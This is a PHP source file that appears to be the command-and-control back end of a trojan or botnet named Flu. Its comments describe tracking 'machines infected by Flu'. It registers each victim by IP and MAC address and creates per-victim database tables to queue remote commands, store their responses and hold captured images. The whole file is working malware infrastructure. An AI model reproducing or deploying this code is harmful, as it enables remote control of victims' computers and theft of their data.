<?php
include "conexion-bbdd.php";

function filtrar($variable)
{
	return mysql_real_escape_string($variable);
}

$macMaquina = filtrar(strip_tags($_GET['m']));
$sistema = filtrar(strip_tags($_GET['s']));

$machine = $_SERVER['REMOTE_ADDR'] ."__".$macMaquina;

/*Comprobamos si existe la máquina en la BBDD*/
$result=mysql_query("SELECT count(*) FROM t_maquinas WHERE maquina='".$machine."'");
if ($row_a = mysql_fetch_array($result))
{
	$count = $row_a[0];
}

$date=date('Y-M-d H:i:s');

/*En caso de que exista, actualizamos la fecha de la última conexión*/
if($count[0]>0)
{
	$result=mysql_query("Update t_maquinas set actualizacion=now(), sistema='" . $sistema . "' where maquina='".$machine."'");
}
/*Si no existe, creamos una nueva tabla con su IP, donde almacenaremos los comandos lanzados con sus respuestas. Y añadiremos una nueva entrada
en la tabla t_maquinas donde se encuentra el listado de todas las máquinas infectadas por Flu*/
else
{
	/*Comprobamos en primer lugar que el nombre de la máquina esté bien formado*/
	if(strlen($macMaquina)==12)
	{
		/*Realizamos las inserciones*/
		$result=mysql_query("INSERT INTO t_maquinas (maquina, actualizacion, sistema) VALUES ('" . $machine . "',now(),'" . $sistema . "')",$conexion);
		$result=mysql_query("CREATE TABLE t_".str_replace(array("."),array("_"),$_SERVER['REMOTE_ADDR'])."__".$macMaquina." (comando varchar(50), respuesta varchar(65000), finalizado boolean, fecha DATETIME, id_unico_comando int, mostrado boolean, PRIMARY KEY (fecha))");
		$result=mysql_query("CREATE TABLE t_imagenes_".str_replace(array("."),array("_"),$_SERVER['REMOTE_ADDR'])."__".$macMaquina." (id int unsigned NOT NULL auto_increment, imagen mediumblob NOT NULL, KEY id (id))");
	}
}

/*Se cierra la conexión con la BBDD*/
include "cerrar-conexion-bbdd.php";
?>